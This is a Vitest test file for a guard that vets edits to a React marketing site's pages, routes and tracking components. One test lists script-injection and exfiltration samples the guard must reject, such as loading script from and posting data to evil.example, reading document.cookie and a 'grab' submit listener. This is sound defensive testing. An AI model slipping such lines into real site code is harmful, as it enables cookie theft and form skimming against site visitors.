import { describe, test, expect } from 'vitest';
import { checkChange, GuardError } from '../guards.js';

const APP = `
<AttributionTracker />
<WhatsAppTracker />
<LeadEventTracker />
<Route path="/book-a-call" element={<BookACall />} />
<Route path="/bookkeeping" element={<BookkeepingLanding />} />
<Route path="/thank-you" element={<ThankYou />} />
<Route path="/booking-confirmed" element={<BookingConfirmed />} />`;

describe('checkChange', () => {
  test('allows ordinary copy edits', () => {
    expect(() => checkChange('src/pages/A.jsx', 'Hello', 'Hello UAE')).not.toThrow();
  });

  test('rejects newly introduced rejected FTA wording', () => {
    expect(() => checkChange('src/pages/A.jsx', '', 'An FTA-approved firm')).toThrow(GuardError);
    expect(() => checkChange('src/pages/A.jsx', '', 'FTA certified agents')).toThrow(GuardError);
  });

  test('tolerates wording that was already there, e.g. a historical code comment', () => {
    const before = '// artwork once read "FTA-approved Tax"';
    expect(() => checkChange('src/components/FtaStamp.jsx', before, `${before}\nnew line`)).not.toThrow();
  });

  test('keeps the tracking components mounted in App.jsx', () => {
    const after = APP.replace('<LeadEventTracker />', '');
    expect(() => checkChange('src/App.jsx', APP, after)).toThrow(/LeadEventTracker/);
  });

  test('refuses to remove a live route that ads may point to', () => {
    const after = APP.replace('<Route path="/bookkeeping" element={<BookkeepingLanding />} />', '');
    expect(() => checkChange('src/App.jsx', APP, after)).toThrow(/\/bookkeeping/);
  });

  test('allows adding a route', () => {
    const after = `${APP}\n<Route path="/vat" element={<VatLanding />} />`;
    expect(() => checkChange('src/App.jsx', APP, after)).not.toThrow();
  });

  test('a commented-out tracker counts as unmounted', () => {
    const after = APP.replace('<LeadEventTracker />', '{/* <LeadEventTracker /> */}');
    expect(() => checkChange('src/App.jsx', APP, after)).toThrow(/LeadEventTracker/);
  });

  test('rejects newly introduced script injection and data-exfiltration primitives', () => {
    for (const code of [
      '<div dangerouslySetInnerHTML={{ __html: x }} />',
      '<script src="https://evil.example/x.js"></script>',
      'eval(payload)',
      'new Function(code)',
      'fetch("https://evil.example", { body })',
      'navigator.sendBeacon(u, d)',
      'new XMLHttpRequest()',
      'document.cookie',
      "window.addEventListener('submit', grab)",
      'import x from "https://evil.example/m.js"',
    ]) {
      expect(() => checkChange('src/pages/A.jsx', '', code), code).toThrow(GuardError);
    }
  });

  test('allows JSON-LD structured data, so an existing page can be copied into a new one', () => {
    const jsonLd = '<script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(seoJsonLd) }} />';
    expect(() => checkChange('src/pages/New.jsx', null, jsonLd.replace('<script', '<div'))).not.toThrow();
  });

  test('copying the real BookkeepingLanding into a new page passes the guards', async () => {
    const { readFileSync } = await import('node:fs');
    const page = readFileSync('src/pages/BookkeepingLanding.jsx', 'utf8');
    expect(() => checkChange('src/pages/VatLanding.jsx', null, page)).not.toThrow();
  });

  test('tolerates those primitives where they already existed', () => {
    const before = 'fetch("/api/quote")';
    expect(() => checkChange('src/components/Q.jsx', before, `${before}\n// copy`)).not.toThrow();
  });

  test('refuses executable file types in public/', () => {
    for (const p of ['public/x.html', 'public/x.js', 'public/x.svg', 'public/x.mjs']) {
      expect(() => checkChange(p, null, 'x')).toThrow(GuardError);
    }
  });

  test('refuses to delete App.jsx', () => {
    expect(() => checkChange('src/App.jsx', APP, null)).toThrow(GuardError);
  });
});
